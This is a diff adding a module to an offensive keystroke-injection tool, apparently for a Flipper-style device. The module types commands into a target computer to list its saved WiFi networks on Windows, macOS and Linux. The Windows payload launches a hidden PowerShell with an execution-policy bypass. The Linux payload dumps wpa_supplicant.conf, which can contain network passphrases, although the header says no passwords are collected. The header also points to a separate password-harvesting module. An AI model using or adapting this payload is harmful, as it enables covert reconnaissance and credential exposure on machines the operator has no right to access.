@@ -1,0 +1,44 @@
+# FlipperPwn Module: Saved WiFi Network Enumeration
+# Lists all saved wireless network SSIDs (no passwords — use wifi_harvest for those).
+# Quick recon to identify networks the target machine trusts.
+
+NAME wifi_enum
+DESCRIPTION Enumerate saved WiFi network profiles on the target system
+CATEGORY recon
+PLATFORMS WIN,MAC,LINUX
+
+# No options required
+
+PLATFORM WIN
+  # Open hidden PowerShell via Run dialog
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # List all saved WLAN profiles and append output to temp file, then open
+  STRING $o="$env:TEMP\wifi_enum.txt"; "=== SAVED WIFI PROFILES ===" | Out-File $o; netsh wlan show profiles | Out-File $o -Append; Start-Process notepad $o
+  ENTER
+
+PLATFORM MAC
+  # Open Terminal via Spotlight
+  DELAY 500
+  GUI SPACE
+  DELAY 400
+  STRING Terminal
+  ENTER
+  DELAY 1200
+  # List preferred wireless networks on en0 (primary WiFi interface)
+  # Note: en1 used on older Macs — adjust if needed
+  STRING o=/tmp/wifi_enum.txt; echo "=== PREFERRED NETWORKS (en0) ===" > $o; networksetup -listpreferredwirelessnetworks en0 >> $o 2>/dev/null; echo "=== PREFERRED NETWORKS (en1) ===" >> $o; networksetup -listpreferredwirelessnetworks en1 >> $o 2>/dev/null; open -e $o
+  ENTER
+
+PLATFORM LINUX
+  # Open terminal emulator
+  DELAY 500
+  CTRL ALT t
+  DELAY 1000
+  # Try nmcli first (NetworkManager), fall back to listing connection files directly
+  STRING o=/tmp/wifi_enum.txt; echo "=== NMCLI CONNECTIONS ===" > $o; nmcli connection show 2>/dev/null >> $o; echo "=== NM CONNECTION FILES ===" >> $o; ls /etc/NetworkManager/system-connections/ 2>/dev/null >> $o; echo "=== WPA SUPPLICANT ===" >> $o; cat /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null >> $o; xdg-open $o 2>/dev/null || cat $o
+  ENTER
